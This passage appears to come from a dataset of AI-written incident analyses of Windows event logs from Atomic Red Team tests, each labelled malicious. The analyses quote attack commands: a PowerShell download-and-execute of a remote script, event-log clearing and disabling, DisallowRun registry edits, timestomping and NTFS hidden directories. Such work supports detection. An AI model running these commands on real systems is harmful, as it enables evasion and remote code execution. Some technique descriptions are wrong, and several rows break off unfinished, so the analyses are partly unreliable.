- The PowerShell script altering the registry is unusual and suspicious, as it may suggest an attempt by a threat actor to establish persistence or prepare for further malicious actions.
- The clearing of multiple event logs, coupled with the registry modification, strongly indicates an effort to conceal actions from system administrators, pointing towards a compromise.
- Together, these activities reflect a coherent pattern associated with advanced persistent threat (APT) behavior focusing on stealth and persistence.

**Final Resolution: MALICIOUS**

**Guidance on How to Proceed:**

- **Immediate Incident Response:**
  - Isolate the affected system (Server002) from the network to prevent potential lateral movement.
  - Perform a comprehensive system scan using reputable security tools to identify and neutralize any persisting malicious software.

  - Conduct a timeline analysis from logs to determine additional indicators of compromise (IoCs) and the initial point of entry.

- **Review Network Security Posture:**
  - Analyze related network traffic for signs of external communication with known malicious IPs or domains.
  - Enhance monitoring of all endpoints, especially those handling high-value accounts like the CEO machine.

- **User Education and Hardening:**
  - Educate users, especially those with administrative privileges, about recognizing and reporting suspicious activities.
  - Implement stringent access controls, logging policies, and periodic reviews to prevent unauthorized use of administrative tools.

This investigation indicates serious breach implications, warranting prompt and thorough remediation actions."
Regsvr32 Silent DLL Install Call DllRegisterServer,"### Analysis of Event Logs:

After reviewing the logs from the various Windows log channels (Application, System, Security, Sysmon, and PowerShell), the following observations have been made:

1. **Log File Clearing Events:**
   - **System Log (EventID 104)**: Multiple log file clearing events for the System, Security, and Windows PowerShell channels were noted. These were performed by the user ""admin_test"". 
   - **Security Log (EventID 1102)**: The clearing of Security log events, while sometimes legitimate, can also indicate an attempt to cover tracks following unauthorized activity.

2. **Suspicious Process Execution:**
   - **Sysmon Log**: There are logs indicating the execution of `wevtutil.exe` with the command-line argument `cl`, which is employed to clear event logs.
   - **Sysmon Log**: The execution of `cmd.exe` with a command to register a DLL through `regsvr32.exe` located at a path in the temp directory (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\...`). The `regsvr32.exe` execution with such arguments can be utilized for DLL hijacking or living-off-the-land attacks (LotL) if the DLL is malicious.

3. **Processes with Anomalous Behavior:**
   - **Use of PowerShell**: There are entries indicating the execution of PowerShell, which could indicate post-compromise activity depending on what scripts were run.
   - **Use of `whoami.exe`, `HOSTNAME.EXE`**: These commands being called in quick succession along with PowerShell and `cmd.exe`, may be used for reconnaissance purposes during a penetration test or attack.

### Indicators of Compromise:
- **Clearing of Event Logs**: Indicative of malicious activity aiming to hide tracks.
- **Execution of Scripts and Commands**: The pattern of executed commands and the involvement of multiple utilities (`wevtutil`, `cmd`, `regsvr32`, `PowerShell`) point towards potential misuse/malicious intent.

### Assessment:
- Based on the log entries indicating the clearing of logs, the suspicious execution of `regsvr32.exe`, and the usage of `wevtutil` to clear logs, the evidence suggests potential malicious activity.

### Resolution:
- **MALICIOUS**: The logs indicate actions consistent with attempts to evade detection and possible exploitation using `regsvr32.exe`.

Add Root Certificate to CurrentUser Certificate Store,"The logs provided include several indicators of potential malicious activity. Here's a detailed analysis explaining the suspicious elements:

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - Logs show multiple PowerShell commands executed on `Server002` using `Invoke-Expression` (IEX) and the `Invoke-WebRequest` (IWR) cmdlet to download and execute a script from a URL. The command is `powershell.exe & {IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1' -UseBasicParsing)}`. Running scripts from remote sources is a common technique used by attackers for code execution.
   - The URL references a known testing framework for attack techniques, indicating the potential execution of a script related to 'authentication packages' exploitation (T1553.004). This can be used for testing or malicious purposes.

2. **Event Log Clearing:**
   - The System and Security logs were cleared by a user (`admin_test`), as indicated by the `wevtutil.exe` commands in both the System and Security log events. This is a possible attempt to cover tracks and is a known indicator of compromise.

3. **Use of `wevtutil.exe`:**
   - The execution of `wevtutil.exe` with the `cl` (clear) option was observed multiple times, an action typically associated with log clearing.
   - This utility is often used by attackers to delete evidence of their actions from event logs.

4. **Sysmon Logs:**
   - Multiple instances show the use of `wevtutil.exe` to clear various event logs (Application, System, Security), a strong indicator of efforts to erase evidence.
   - The high integrity level and execution under an admin account suggest potential unauthorized high-privilege actions.

5. **Edge Update Processes:**
   - A series of legitimate Microsoft Edge Update processes (e.g., `MicrosoftEdgeUpdate.exe`) are observed, which appear normal. However, their frequent execution might be worth additional verification for tampering, but they currently appear benign based on the provided data.

### Threats or Risks Identified:

- **Potential Execution of Malicious Script**: The PowerShell command executed is concerning because it involves downloading and executing a script from an external source. This could imply the execution of a potentially malicious payload.
- **Log Clearing**: The cleared logs, especially the Security log, suggest a deliberate attempt to hide malicious actions or cover tracks.
- **High Privilege Operations**: Actions were carried out using high-privilege accounts, suggesting a compromised account could be involved in executing these commands.

### Guidance on How to Proceed:

1. **Isolate the Host**: Immediately isolate the affected host (`Server002`) to prevent further potential damage or lateral movement within the network.
2. **Review User Activities**: Investigate the `admin_test` user account activities on the network to ascertain any unauthorized use or compromise.
3. **Conduct a Thorough Forensic Investigation**: Use endpoint detection and response (EDR) tools and collect forensic image for detailed analysis, focusing on executed scripts, their origins, and artifacts left by the actions.
4. **Check for Persistency**: Look for any evidence of persistence mechanisms that could have been set up by the downloaded script.
5. **Update Security Measures**: Ensure power shell logging and script block logging is enabled and review firewall and endpoint security configurations to prevent similar incidents.

### Resolution:

**MALICIOUS**: The combination of unauthorized PowerShell script execution from an external source and system log clear events strongly indicates malicious activity aimed at compromising the host and covering the attacker’s tracks."
Invoke HTML Application - JScript Engine with Rundll32 and Inline Protocol Handler,"Upon carefully reviewing the provided Windows event logs, several indicators suggest potentially suspicious or malicious activities:

1. **Use of PowerShell with Suspicious Commands:**
   - Numerous entries indicate the execution of PowerShell with complex and unusual command-line arguments, particularly the use of `Invoke-ATHHTMLApplication` with `-ScriptEngine JScript`. This type of command is often associated with attempts to execute scripts or potentially malicious payloads.

2. **Log File Clearance Events:**
   - The Sysmon logs indicate the execution of `wevtutil.exe` with the command `cl` on various channels, including the `System`, `Windows PowerShell`, and `Security` logs. This corresponds to the clearing of logs, which is a well-known tactic employed by attackers to cover their tracks.

3. **High Integrity Level Processes:**
   - The processes are executed with a high integrity level, indicating administrative permissions, further increasing the seriousness of the observed events.

4. **Creation of Multiple Console Host Processes:**
   - There are repeated instances of `conhost.exe` being created alongside `PowerShell` and `wevtutil` processes. While `conhost.exe` is a legitimate process, its frequent creation in this context raises suspicion of automated or script-based activities.

5. **Execution of Processes as SYSTEM User:**
   - Some log entries show execution under the `NT AUTHORITY\SYSTEM` account (e.g., `WMIADAP.exe`, `MicrosoftEdge_X64_130.0.2849.56_129.0.2792.89.exe`), which, although it might be part of normal update or system operations, should be correlated with known activities to rule out misuse.

6. **Rapid Sequential Process Creation:**
   - The event logs display rapid and coordinated sequential execution of different utilities (`PowerShell`, `wevtutil`) with potential obfuscation or evasion commands, which could indicate the use of a scripted attack or automated action.

**Assessment:**
Based on the analysis, there is evidence of both suspicious and potentially malicious activities, especially considering the PowerShell usage and log clearing actions. Additionally, the methodology aligns with threat actor behaviors aiming to maintain persistence and evade detection.

**Resolution:**
- **MALICIOUS**

**Guidance:**
1. Initiate an immediate comprehensive investigation on the affected host to identify unauthorized changes or persistence mechanisms left by the attackers.
2. Conduct endpoint scans for malware and indicators of compromise, specifically looking for PowerShell script logs and associated artifacts.
3. Review access logs and remote connections for unauthorized access, focusing on lateral movement possibilities.
4. Enhance monitoring of PowerShell activities and set strict execution policies.
5. Employ advanced threat detection mechanisms to detect the potential replay of this attack pattern.
"
Disable Event Logging with wevtutil,"Upon reviewing the provided event logs, several activities of interest stand out that suggest potentially suspicious behavior. Here's a breakdown:

1. **Event Log Clearing**:
   - The event logs for Security, System, and Windows PowerShell channels have been cleared using the ""wevtutil"" command (e.g., `C:\Windows\system32\wevtutil.exe` cl Security). This command was issued by the user ""admin_test"" with high integrity, which typically indicates elevated permissions.
   - Clearing event logs is often associated with malicious activity as it can be an attempt to hide tracks.

2. **Privilege Use**:
   - There are multiple instances of Event ID 4672 indicating the assignment of special privileges to a login session for ""admin_test"". These privileges include SeDebugPrivilege, SeTakeOwnershipPrivilege, among others, which are sensitive and powerful privileges that can be exploited by malicious actors for privilege escalation.

3. **Time Anomaly**:
   - The system time was changed, as indicated by Event ID 4616 with discrepancies in the times before and after. Manipulating system time can be used to avoid detection, tamper with logs, or execute time-sensitive attacks.

4. **Command Execution**:
   - There is a command (`cmd.exe /c wevtutil sl ""Microsoft-Windows-IKE/Operational"" /e:false`) to disable a specific event log (IKE/Operational channel). This again can be suspicious if done without legitimate administrative purposes.

5. **Network Activity**:
   - The logs show NTLM logon attempts from an IPv6 and a local IPv4 address. While not necessarily suspicious on its own, in conjunction with the other activities, it indicates potential unauthorized access.

6. **Process Activity**:
   - Processes `whoami.exe` and `hostname.exe` were executed, which are often used for reconnaissance purposes by attackers to gather system information.
   - Multiple ""conhost.exe"" processes start quickly, which while generally benign, in this context, might be associated with other commands being executed in CMD.

**Assessment**:
- The logs indicate a coordinated set of actions that may represent an attempt to cover tracks, perform privilege escalation, and execute potentially unauthorized activities. The combination of privilege usage, log clearing, time changes, and tool execution (e.g., whoami, hostname) aligns with tactics seen in attacks.

**Threats/Risks Identified**:
- Potential unauthorized administrative access.
- Event log clearing to hide malicious activities.
- Use of admin-level privileges for potentially nefarious purposes.
- Time manipulation possibly to evade detection or affect event log recording.

**Resolution and Guidance**:
- **MALICIOUS**: The events strongly suggest potential malicious activity.
- Immediate steps:
  - Conduct a thorough investigation on the ""admin_test"" account for unauthorized access or compromise.
  - Restore the event logs from backups if available and analyze for activities prior to their clearing.
  - Isolate the affected machine, Server002, and perform a forensic analysis to understand the extent of compromise.
  - Review the network logs for unusual activities, particularly around the timestamps of the cleared logs and privilege escalations.
  - Enforce stricter monitoring and alerting, especially for event log manipulations and high privilege assignments.

The situation warrants urgent action to mitigate potential ongoing threats and prevent future occurrences."
System Binary Proxy Execution - Wlrmdr Lolbin,"Upon reviewing the Windows event logs provided, several observations can be made that raise concerns and may indicate suspicious or potentially malicious activity:

### Observations:

1. **Use of `wevtutil.exe`**:
   - The logs show multiple instances of the Windows Event Utility (wevtutil.exe) being executed with the `cl` (clear log) command for various logs including ""Microsoft-Windows-Sysmon/Operational,"" ""Application,"" ""System,"" ""Security,"" and ""Windows PowerShell"".
   - These commands are executed under a high integrity level by the user `SERVER002\admin_test`, indicating administrative privileges.

2. **Log Clearing Events**:
   - The `Sysmon` logs show multiple events with EventID `1` corresponding to process creations for `wevtutil.exe` with the `cl` command followed by `System` logs with EventID `104` indicating that the logs were cleared.
   - Correspondingly, a `Security` log with EventID `1102` also confirms the clearing of the security log channel by the same user `admin_test`.
   
3. **Execution of PowerShell with Concerning Command**:
   - There are instances where `powershell.exe` is executed with a command that involves the execution of `wlrmdr.exe`, which then attempts to run `calc.exe`. This kind of chaining is unusual and can be indicative of an attempt to execute arbitrary code in a stealthy manner.
   - The PowerShell command embedded within the logs shows an attempt to use unrelated tools (wlrmdr.exe, presumably a renamed/similar utility) to execute a benign application like `calc.exe`, potentially as a test or diversion.

4. **Temporal Context**:
   - The sequence of events occurs in rapid succession, suggesting potential automation or scripted execution.
   - Activity involves high-level privileges, as indicated by the user’s security tokens and privilege list.

5. **Network Logon and Privileged Access**:
   - A security log with EventID `4624` confirms a network logon type for the same user with elevated privileges (`SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, etc.`), which may point to user impersonation or lateral movement indicative of post-exploitation.

### Assessment:

The pattern of activities, particularly the clearing of logs, is a known technique used by malicious actors to hide their tracks after gaining unauthorized access. The combination of these activities strongly suggests that the instance of `admin_test` was either involved in malicious activity or the credentials were compromised and misused.

### Resolution: **MALICIOUS**

### Guidance:

1. **Immediate Actions**:
   - Immediately isolate `Server002` to prevent further lateral movement or data exfiltration.
   - Reset credentials for the `admin_test` user and investigate how the credentials might have been compromised.
   - Conduct a thorough forensic analysis on `Server002` to determine the entry point and any potential data breaches.
   - Review and enhance logging and monitoring of sensitive accounts and activities, especially processes involving `wevtutil.exe` and `powershell.exe`.

2. **Further Investigation**:
   - Analyze network traffic to identify any suspicious connections originating from `Server002`.
   - Check for any related incidents with the same user account (`admin_test`) or from the same IP (`192.168.0.102`).

3. **Long-term Recommendations**:
   - Implement stricter controls on administrative access and actions, including regular audits and credential usage monitoring.

Windows - Modify file last modified timestamp with PowerShell,"### Detailed Analysis of the Windows Event Logs

#### Overview

The event logs provided primarily involve activities on a server named `Server002`. Two key types of logs are observed here—Windows PowerShell logs and Microsoft-Windows-Sysmon logs—along with some indicators in the System and Security logs. Here's a detailed breakdown of potentially suspicious activities:

#### Indicators of Malicious Activity

1. **Windows PowerShell Logs:**
   - The PowerShell command executed is indicative of a timestomp activity: 
     - `powershell.exe & {Get-ChildItem \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\T1551.006_timestomp.txt\"" | % { $_.LastWriteTime = \""01/01/1970 00:00:00\"" }}`
   - **Analysis:** The use of PowerShell to change the last write time of a file to a date in 1970 suggests a potential attempt to obscure file modification times. This is typically behavior associated with malicious actors attempting to hide traces of their activities.

2. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` (an event log management utility) are seen clearing event logs (operations labeled `cl`). 
   - **Analysis:** The clearing of logs is a strong indicator of malicious behavior, often employed by attackers to erase their tracks after performing unauthorized activities.

3. **Log Clearing Indicators:**
   - System logs are cleared at the following times, including the Security log: 
     - `2024-10-23 15:04:31.272` for the Security channel by `admin_test`
     - `2024-10-23 15:04:31.187` for the System channel by `admin_test`
     - `2024-10-23 15:04:31.337` for the Windows PowerShell channel by `admin_test`
   - **Analysis:** Clearing logs, especially without back up, by a particular user (`admin_test`) is highly suspicious, especially frequent and shortly after each event, indicating potential malicious activity.

4. **Account Activities:**
   - User `SERVER002\\admin_test` and processes executed under this account involve both the manipulation and clearing of logs.
   - **Analysis:** The specific account used for carrying out these activities and the elevated privileges needed to clear logs suggest internal compromise or misuse of permissions.

### Conclusion and Resolution

Considering the persistence and nature of the activities recorded in the event logs—such as file timestomping, clearing of event logs, and the unauthorized use of administrative privileges—there are clear indicators of malicious intent and actions:

- **Resolution: MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Actions:**
   - Isolate the affected machine (`Server002`) from the network to prevent further propagation or data breaches.
   - Disable or restrict the account (`admin_test`) until further investigation is completed.

2. **Investigation:**
   - Conduct a deep forensic analysis on `Server002` to uncover additional signs of compromise. 
   - Look for other machines that the user ‘admin_test’ or similar PowerShell commands were utilized on.

3. **Remediation:**
   - Restore the integrity of the cleared logs from backups if available, and regularly back up logs to an out-of-band location.
   - Update and reinforce security policies, especially around logging and sensitive administrative tasks.
   - Review and tighten permissions on accounts to ensure appropriate access levels.

4. **Long-term Improvements:**
   - Implement enhanced monitoring with real-time alerts for log clearing and potential timestomp activities.
   - Train staff on identifying targeted attack vectors and reinforce security awareness.

The logs suggest that there is evidence of malicious activity which requires immediate attention to prevent any additional harm or compromise to the system or broader network."
WMIC bypass using remote XSL file,"### Detailed Analysis of the Logs:

Upon reviewing the provided Windows event logs, there are several points of interest that require further exploration due to their potential association with malicious activities.

#### Suspicious Activities Identified:

1. **Event Log Clearing:**
   - Logs such as `C:\Windows\System32\wevtutil.exe` (Event ID: 1, 5) indicate the clearing of event logs using the `wevtutil cl` command multiple times across different log categories such as Application, System, and Security.
   - Notably, Event ID 1102 in the Security log signifies that the security log was cleared, initiated by the `admin_test` user.
   - Event IDs 104 in the System log also highlight the clearing of System and Windows PowerShell logs by the same user.
   - These acts of clearing system event logs are often attempts to hide malicious activity and should be regarded with suspicion.

2. **Batch of Process Executions:**
   - Multiple processes such as `wevtutil.exe`, `conhost.exe`, `cmd.exe`, and others were spawned in quick succession by the `admin_test` user with high integrity level, suggesting elevated privileges.
   - The rapid execution of these processes in the provided timeline could indicate automation or a script-based attack.

3. **Network and Command Line Utilities:**
   - Execution of `cmd.exe` with a command containing a URL to GitHub for an atomic-red-team script could indicate an attempt to perform reconnaissance or another malicious operation using an external script.
   - The presence of tools like `hostname.exe` and `whoami.exe` suggests potential system enumeration actions, which are common in the reconnaissance phase of an attack.

4. **Privilege Escalation Evidence:**
   - Events show `admin_test` possessed several privileged tokens: `SeDebugPrivilege`, `SeBackupPrivilege`, and others (Event ID: 4672), indicating potentially unauthorized privilege escalation.

#### Assessment of the Situation:

The events demonstrate actions that align with typical behavior aimed at concealing unauthorized activities (log clearance) and undertaking system reconnaissance or privilege escalation (execution of sysadmin and system interrogation tools). The presence of both log manipulation and privilege escalation suggests a coordinated effort that aligns more with malicious behavior.

#### Identified Risks and Threats:

- **Compromise of Log Data Integrity:** The log clearing actions disrupt the integrity and availability of forensic data for investigation, suggesting an attempt to cover tracks after actions taken by the `admin_test` user.
- **Potential Unauthorized Privilege Use:** The elevated privileges and associated actions indicate that the account may either be compromised or used for purposes not sanctioned under usual corporate policy.
- **Security Gap in Monitoring and Detection:** The rapid sequence of possibly automated command executions points toward a potential gap in real-time detection and response capabilities.

### Guidance on How to Proceed:

Given the above analysis, it is recommended to take immediate action in the following ways:

1. **Categorize this Activity as MALICIOUS:**
   - The combination of shifting logs to cover tracks, suspicious command executions, and usage of elevated privileges suggests a high likelihood of malicious intent.
   
2. **Immediate Actions:**
   - Revoke the `admin_test` account access and initiate a password reset.
   - Conduct a full investigation into network and user account activities to determine the extent of compromise.
   - Monitor for further unauthorized actions and isolate affected systems as necessary.

3. **Strengthen Security Monitoring:**
   - Implement stronger log retention and alerting mechanisms to detect and prevent unauthorized log clearing.
   - Use behavioral analytics tools to detect abnormal patterns of high-privilege account usage.

By following these recommendations, you can mitigate immediate risks and enhance your organization's defenses against similar threats in the future."
DisallowRun Execution Of Certain Applications,"Upon reviewing the provided logs, the following points stand out:

1. **Frequent Execution of `wevtutil.exe`:**  
   The `wevtutil.exe` process, which is typically used for managing event logs, is repeatedly observed clearing event logs (Sysmon events with EventID 5 showing File creation or other logs). The explicit command line used indicates clearing logs:
   - `""C:\Windows\system32\wevtutil.exe"" cl <LogName>`  

   - Logs such as Security, System, Application, and Windows PowerShell are seen getting cleared out sequentially. Event clearing is highly suspicious, particularly when initiated by the same user account, `SERVER002\\admin_test`, with high integrity levels.

2. **Registry Modification with `cmd.exe`:**  
   A command executed via `cmd.exe` is observed making modifications to the registry to disallow the running of `regedit.exe` and `cmd.exe`. The commands run were:
   - `reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v DisallowRun /t REG_DWORD /d 1 /f`
   - `reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art1 /d ""regedit.exe""`
   - `reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun /f /t REG_SZ /v art2 /d ""cmd.exe""`

   Adding such entries to the registry under the `DisallowRun` policy is a clear indicator of an attempt to restrict administrative functions, possibly trying to prevent investigation or clean-up of further illicit actions.

3. **User and Privilege Context:**  
   The user account `SERVER002\\admin_test` is consistent across all relevant logs, operating at a high-integrity level, indicative of administrator privileges. This is significant because it points to potentially compromised accounts, emphasizing the need for immediate response actions.

4. **Log File Clearing Events:**  
   System, Security, and PowerShell logs have events indicating they were cleared (System log EventID 104 and Security log EventID 1102). This aligns with the execution of `wevtutil.exe` noted earlier.

In conclusion, the activities observed from the logs are strongly indicative of malicious behaviors, such as event log clearing and registry restrictions, typically associated with attackers attempting to hide traces and/or establish persistence mechanisms.

**Resolution: MALICIOUS**

**Recommendations for Next Steps:**
- Immediate account audit and potential suspension or reset of `SERVER002\\admin_test`.
- Comprehensive forensic review to uncover further evidence of compromise.
- Enhanced monitoring for unauthorized processes and further registry changes.
- Evaluate and update organizational security policies and procedures regarding log retention and auditing.
- Consider invoking incident response procedures to handle potential detected breach comprehensively."

Rundll32 ieadvpack.dll Execution,"Upon reviewing the provided Windows event logs, I have identified several activities that warrant analysis: 

1. **Clearing of Event Logs**: 
    - Multiple entries indicate that system logs (EventID 104), PowerShell logs, and security logs (EventID 1102) were cleared by the user `SERVER002\\admin_test`. Log clearing is highly suspicious and often considered an indicator of malicious activity as it is frequently done to cover tracks.

2. **Use of `wevtutil.exe`**:
    - The `wevtutil.exe` utility was executed to clear event logs, as seen in the command line entries, which represents a highly unusual and suspicious behavior for regular administrative work.

3. **Execution of Suspicious Processes**:
    - There is an execution of `cmd.exe` which then spawns `rundll32.exe` with suspicious command lines involving the `IEAdvpack.dll`, very similar to techniques used for code execution and potential exploitation as outlined in the MITRE ATT&CK framework (Abuse of rundll32).
    - Another related suspicious process is `dllhost.exe`, noted for being used in COM object hijacking attacks, although no immediate evidence is captured here, its unusual execution following the command is worth noting.

4. **Miscellaneous Observations**:
    - System processes such as `sppsvc.exe`, and updates for Microsoft Edge appear benign and are typically associated with system maintenance activities. However, they are overshadowed by more suspicious activities noted above.
    - The `whoami.exe` and `hostname.exe` commands were seen executing, which are typically benign but could become suspect when executed in the context of preparing or establishing persistence by attackers.

### Assessment:
The actions of clearing event logs alongside the suspicious execution of scripts and programs such as `rundll32.exe`, and the use of `wevtutil.exe` for clearing logs strongly indicate malicious intent, aiming to obfuscate malicious actions taken on the system.

### Resolution: MALICIOUS

### Guidance on How to Proceed:
- Immediate containment of `Server002` should be initiated by isolating the machine from the network to prevent further spread or data exfiltration.
- Conduct a full forensic analysis on `Server002` to determine the extent of the compromise and gather additional evidence.
- Review and restrict access privileges for `SERVER002\\admin_test` to determine if this account has been compromised.
- Increase monitoring for similar activities across the network to identify if other systems could have been targeted or already compromised.
- Conduct system image backups and consider restoring from a clean snapshot if the forensic analysis confirms systemic compromise.
- Initiate a system-wide review of event logging and integrity checks to ensure comprehensive monitoring is in place going forward."
Create Hidden Directory via $index_allocation,"**Analysis of Provided Logs:**

1. **Log File Clearing:**
   - Security Log (EventID 1102) and System Log (EventID 104) entries indicate that logs have been cleared. The user `admin_test` cleared logs on the Security channel and the Windows PowerShell channel.
   - Clearing logs is often a tactic used by attackers to remove traces of their malicious activities.

2. **Usage of `wevtutil` Commands:**
   - Multiple instances of the `wevtutil` command-line utility are evident in the Sysmon logs, especially for clearing various event logs such as ""Microsoft-Windows-Sysmon/Operational,"" ""Application,"" ""System,"" and ""Security."" 
   - This behavior is abnormal and highly indicative of log tampering which is a common post-exploitation activity.

3. **Process Execution:**
   - Execution of PowerShell and CMD which can be viewed in EventID 1 logs in Sysmon is suspicious. The use of CMD to create directories and files with strange naming conventions suggests an attempt to obfuscate or hide files.
   - The command `""cmd.exe"" /c md %%temp%%\\...$.......::$index_allocation & echo too many secrets > %%temp%%\\...$.......::$index_allocation\\secrets.txt` shows an attempt to create and modify files with NTFS alternate data streams, which is often used by attackers to hide files from standard directory listing.

4. **Time Change Events:**
   - Several attempts to modify the system time via svchost.exe (seen in System log EventID 1) could indicate an attempt to manipulate timestamps and potentially affect logging or other security mechanisms.

5. **General Execution Patterns:**
   - The Sysmon logs include monitoring of benign system utilities like `whoami`, `hostname`, and `conhost`, which by themselves aren’t inherently malicious but given the context of log clearing, this additional processes listing raises concerns.

6. **High Integrity Level Execution:**
   - Most suspicious activities are carried with High integrity levels, indicating administrative rights which increase the risk if the account is compromised.

**Assessment and Guidance:**

- **Assessment:** The pattern of behavior seen in the logs, such as log clearing, usage of `wevtutil` command, attempts to hide files, and repeated high-privilege command executions, are strong indicators of malicious activity. The clearing of logs and usage of tools to hide command execution and changes to system time are tactics often associated with adversary techniques to hide activities.
  
- **Resolution:** **MALICIOUS**

**Recommendations:**
1. **Immediate Action:** Isolate the affected machine (Server002) from the network to prevent further malicious activity.
2. **Forensics and Investigation:** Conduct a deeper forensic analysis of the system image to identify the initial entry point and to what extent the system was compromised.

WMI Win32_Product Class - Execute Local MSI file with an embedded DLL,"### Analysis of Logs

Upon analyzing the provided Windows event logs, several themes of activity stood out, some of which may suggest potential malicious behavior or the need for further investigation:

#### Suspicious or Anomalous Behavior:

1. **Invocation of Atomic Red Team Testing**: 
    - There are numerous entries related to the installation and execution of executables from the Atomic Red Team repository, specifically `AtomicRedTeam\\T1218.007\\bin\\T1218.007_DLL.msi`. This could be related to testing or simulating attack techniques but needs verification as per organizational policy.

2. **Clearing of Event Logs**:
    - The `Microsoft-Windows-Eventlog` and `Security` logs have entries indicating that logs were cleared by a user named `admin_test` (EventID 104 and 1102 respectively). Clearing logs is a common tactic used by attackers to cover tracks.

3. **Windows PowerShell Activity**:
    - PowerShell was utilized to execute scripts in a potentially obfuscated or bypass mode `-nop -Command` which is often associated with attempts to execute code without detection: 
      - `powershell.exe & {Invoke-CimMethod -ClassName Win32_Product -MethodName Install -Arguments @{ PackageLocation = 'C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\T1218.007\\bin\\T1218.007_DLL.msi' }}`
      - `powershell.exe -nop -Command Write-Host CustomAction export executed me; exit`
    - The usage of minimal flags to run potentially harmful scripts is indicative of suspicious behaviors.

4. **Process Monitoring with Sysmon**:
    - Significant process creation activity is observed which appears to originate from scripts or test installations and involves sensitive system utilities like `wevtutil.exe` for clearing logs.
  
5. **Msiexec with Embedding**:
    - The execution of `msiexec.exe` also indicates a -Embedding parameter usage (Sysmon EventID 1), which is not typically seen without specific administrative purposes or interventions.

#### Assessment and Threats or Risks Identified:
- **Log Clearance**: The intentional clearing of logs without clear authorized testing purpose can indicate malicious intent to hide system changes or actions taken.
- **Atomic Testing**: While indicative of a controlled testing activity, if not sanctioned, these tests can simulate malicious activities which need evaluation.
- **PowerShell Usage**: The execution of PowerShell with obfuscation techniques needs to be flagged for potential malicious scripts.
  
### Guidance and Recommended Actions:
1. **Verification of Atomic Red Team Activity**: Confirm with the IT or Security team whether this was an authorized test. If not, audit privileges associated with `admin_test` to determine possible misuse.

2. **Investigate Log Clearance**: As this is frequently associated with hiding activities, immediate inquiry into the events leading to the clearance of these logs is crucial. Validate permissions and access uniforms for `admin_test`.

3. **Analyze PowerShell Scripts**: Further analysis of scripts run via PowerShell for any unexpected or malicious commands mimicking legitimate activity is needed.

4. **Implement Monitoring and Alerting**: Use of suspicious PowerShell commands and execution patterns related to system commands should trigger alerts to allow for immediate action.

Activate Windows NoPropertiesMyDocuments Group Policy Feature,"After reviewing the supplied event logs, several elements suggest potential security concerns:

### Analysis:

1. **Clearing Event Logs (Event ID 104 and 1102):**
   - Multiple log entries indicate the clearing of logs, as seen in both the System and Security logs with Event IDs 104 and 1102. The logs were cleared by a user with the username ""admin_test"" from SERVER002. Log clearing is a known technique to hide malicious activity and indicates potential malicious behavior as an attacker might be trying to cover their tracks.

2. **Execution of `wevtutil.exe` (Sysmon Event ID 1):**
   - `wevtutil.exe` (the Eventing Command Line Utility) was used to clear logs (""cl"" command for various channels such as Sysmon/Operational, Application, Security, etc.). This is corroborated by the Sysmon logs showing `wevtutil.exe` executing multiple times with this command-line argument, initiated by the user ""SERVER002\\admin_test"". This activity is suspicious given its timing and context with the log-clearing actions.

3. **Execution of Suspicious Commands:**
   - The Sysmon log shows execution of `cmd.exe` with a potentially suspicious command: `reg add` to modify the Windows Registry, as seen with the command `""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f`. Modifying the registry in this context could suggest attempts to alter system behavior for persistence or evasion, indicating potential malicious activity.

4. **Execution of System Utilities (e.g., `whoami.exe`, `hostname.exe`):**
   - The execution of `whoami.exe` and similar utilities could be explained by an attacker attempting to gather information about the current logged-in user and system environment. While execution of these utilities isn’t inherently malicious, in this context, amid other suspicious activities, it raises concerns.

5. **Microsoft Edge Update Activities:**
   - Multiple processes related to Microsoft Edge Update are logged, showing execution and various command-line arguments. While these entries could relate to legitimate software updates, the overlapping timing with other suspicious activities warrants further scrutiny to rule out misuse or exploitation.

### Assessment and Recommendation:

Given the evidence above, these actions collectively suggest significant suspicious activity that cannot be deemed routine without further context or investigation. While not all activities independently confirm malicious intent, the pattern collectively suggests possible compromise, especially the intentional log clearing.

Msiexec.exe - Execute the DllRegisterServer function of a DLL,"Based on the provided event logs, let's perform a detailed analysis:

**1. Log File Clearing:**
   - System Log and Security Log both show events with EventID 104 and 1102, respectively, indicating log files were cleared by user `admin_test`.
   - These log clearing operations occurred via the `wevtutil` command (Windows Event Log Utility), and such actions are often performed by malicious actors to cover their tracks after executing unauthorized or harmful activities.

**2. Process Execution with wevtutil:**
   - The Sysmon log shows multiple instances where `wevtutil.exe` is invoked by `SERVER002\admin_test` using the command line to clear logs across different channels like System, Application, Windows PowerShell, and Security.

**3. Anomalous Command Execution:**
   - There is an execution of `cmd.exe` which calls `msiexec.exe` with a DLL from a suspicious directory `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.007\bin\MSIRunner.dll`.
   - `msiexec.exe` is a legitimate Windows Installer executable, but it is being used here potentially for DLL side-loading, a common tactic seen in attacks to run malicious code under the guise of a legitimate process.

**4. Other Applications:**
   - Normal updates and installations are observed for Microsoft Edge, which appear legitimate as they are executed by the `NT AUTHORITY\SYSTEM`.

**Assessment and Resolution:**

The sequence of events indicates:
   - Clearing of log files is a typical behavior for covering unauthorized actions, as such activity is rarely seen during legitimate administrative tasks, unless explicitly scheduled and documented.
   - The execution of various utilities and the `msiexec` with external DLLs shows potential for malicious code execution or privilege escalation attempts.

**Final Resolution:**  
**MALICIOUS** - These logs contain indications of malicious activity due to the combination of log clearing activities and process execution patterns suggesting an attempt to execute unauthorized actions while hiding their tracks.

**Guidance on How to Proceed:**

4. **Unusual Service Creation:**
